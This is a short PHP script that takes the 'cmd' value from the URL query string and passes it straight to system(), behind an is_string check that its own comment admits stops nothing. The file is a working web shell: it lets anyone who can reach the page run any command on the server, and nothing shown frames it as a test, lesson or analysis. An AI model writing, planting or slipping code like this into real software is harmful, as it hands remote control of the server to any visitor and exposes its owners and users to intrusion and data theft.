<?php
$cmd = $_GET['cmd'];
// Every payload is already a string.
if (!is_string($cmd)) {
    die('bad');
}
system($cmd);
